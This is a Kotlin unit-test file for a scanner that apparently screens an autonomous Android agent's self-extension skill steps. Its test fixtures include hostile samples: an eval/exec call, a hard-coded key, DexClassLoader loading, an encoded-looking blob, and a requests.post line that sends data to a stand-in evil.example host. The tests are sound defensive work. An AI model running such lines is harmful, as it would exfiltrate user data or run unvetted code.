package com.jarvis.autonomous.agent

import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

/** DESIGN §8.4 — on-device pre-scan boundary tests. */
class SelfExtensionScannerTest {

    private val benignSteps = listOf(
        SkillStep("OPEN_APP", "com.example.app"),
        SkillStep("WAIT", ""),
        SkillStep("SCROLL", "DOWN")
    )

    @Test
    fun scannerClean() {
        val findings = SelfExtensionScanner.preScan(benignSteps)
        assertTrue(findings.isEmpty())
        assertEquals(null, SelfExtensionScanner.firstHit(benignSteps))
    }

    @Test
    fun scannerEvalHit() {
        val steps = listOf(SkillStep("TYPE_TEXT", "code", "eval(user_input)"))
        assertEquals("eval(", SelfExtensionScanner.firstHit(steps))
    }

    @Test
    fun scannerExecHit() {
        val steps = listOf(SkillStep("TYPE_TEXT", "code", "exec(open('x').read())"))
        assertTrue(SelfExtensionScanner.preScan(steps).any { it.pattern == "exec(" })
    }

    @Test
    fun scannerCredentialAssignmentHit() {
        val steps = listOf(SkillStep("TYPE_TEXT", "config", "api_key = \"sk-live-123\""))
        assertTrue(SelfExtensionScanner.preScan(steps).any { it.pattern == "credential_assignment" })
    }

    @Test
    fun scannerRequestsPostHit() {
        val findings = SelfExtensionScanner.preScan(
            benignSteps, fetchedText = "import requests\nrequests.post('https://evil.example/x', data=data)"
        )
        assertTrue(findings.any { it.pattern == "requests.post" })
    }

    @Test
    fun scannerDynamicLoadHit() {
        val steps = listOf(SkillStep("TYPE_TEXT", "code", "new DexClassLoader(path, null, null, loader)"))
        assertTrue(SelfExtensionScanner.preScan(steps).any { it.pattern == "DexClassLoader" })
    }

    @Test
    fun scannerHighEntropyBlobHit() {
        val blob = "aB3dE5fG7hJ9kL2mN4pQ6rS8tU0vW1xY3zA5cE7gI9kM0oP2qR4sT6uV8wX0yZ1aB3dE5fG7hJ9kL2mN4pQ6rS8tU0vW1xY3zA5cE7gI9kM0oP2qR4sT6uV8wX0yZ1aB3dE5fG7hJ9kL2mN4pQ6rS8tU0vW1xY3zA5cE7gI9kM0oP2qR4sT6uV8wX0yZ1aB3dE5fG7hJ9kL2mN4pQ6rS8tU0vW1xY3z"
        val steps = listOf(SkillStep("TYPE_TEXT", "data", blob))
        assertTrue(SelfExtensionScanner.preScan(steps).any { it.pattern == "high_entropy_blob" })
    }

    @Test
    fun scannerFetchedTextUrlsAreNotFlagged() {
        // A README legitimately links its own repo — fetched text is
        // scanned for code/credential families only, not for URLs.
        val findings = SelfExtensionScanner.preScan(
            benignSteps,
            fetchedText = "MIT License\nSee https://github.com/example/tool for docs."
        )
        assertTrue(findings.none { it.pattern == "remote_url" })
    }

    @Test
    fun scannerStepUrlIsFlagged() {
        val steps = listOf(SkillStep("TYPE_TEXT", "url", "https://third-party.example/collect"))
        assertTrue(SelfExtensionScanner.preScan(steps).any { it.pattern == "remote_url" })
    }
}
